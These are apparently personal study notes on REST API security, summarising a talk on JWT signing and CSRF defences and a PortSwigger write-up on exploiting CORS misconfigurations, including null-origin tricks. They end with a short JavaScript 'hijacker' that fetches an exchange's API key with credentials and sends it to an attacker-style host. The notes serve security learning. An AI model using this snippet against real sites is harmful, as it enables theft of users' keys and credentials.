### [Common REST API security pitfalls by Philippe De Ryck](https://www.youtube.com/watch?v=Meh4EUmLCfM)

 - Allowing API's over HTTP
 - JWT Tokes
	 - Signing can be done in two ways : Shared Secret, Public/private key pair. 
		 - Sign with private key, verify the signature with public key
	 - Defending against CSRF in API's
		 - Transparent cookies.
			 - Server sends two cookies instead of one, one CSRF token in cookie , then cookie value is copied to header, as header can not be set by any other domain then the origin, server will reject the request.

### [Exploiting CORS Misconfigurations for Bitcoins and Bounties](http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html)
 
 - [Video](https://www.youtube.com/watch?v=wgkj4ZgxI4c&list=PLpr-xdpM8wG8RHOguwOZhUHkKiDeWpvFp&index=31)
	 - CORS doesn't supports
		 - *.domain.com but `*`
		 - Multiple domain in Access-control-allow-origin header.
		 - `*` can not be used for the resource that requires credentials. browsers don't send it anyway.
			 - This can be achived by dynamic generation in response.
				 - So whenever server get the request from the client browser.
				 - It sends the ACAO header with the calling origin.
		 - Testing
			 - Change the origin header to differnt domain then host and check for response ACAO header value, if it is same as domain then it looks good otherwise it's a vulnerablity also look for ACAC header as it sends cookies with the requests if header is set.
			 - Sometimes `example.com.evil.net` also works
				 - may be becasue of *example*
		 - What is null origin
			 - ACAO: `null`
			 - Files on your local file system uses null origin.
			 - iframe which are sandbox also keep origin to null origin.
			 - null is more dangerous.
		 	 - Any Website can allow null origin if used in iframe sandbox.
			
					<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src='data:text/							html,<script>*cors stuff here*</script>’></iframe>


		 - Check if origin allows - http://
	 - Exploitation without ACAC
		 - Tunneling like IntelliJ local server access to send private ssh keys.
		 - Basic Auth is also allowed to send with ACAC

Simple Hijacker

		var req = new XMLHttpRequest(); 
		req.onload = reqListener; 
		req.open('get','https://btc-exchange/api/requestApiKey',true); 
		req.withCredentials = true;
		req.send();

		function reqListener() {
		    location='//atttacker.net/log?key='+this.responseText; 
		};
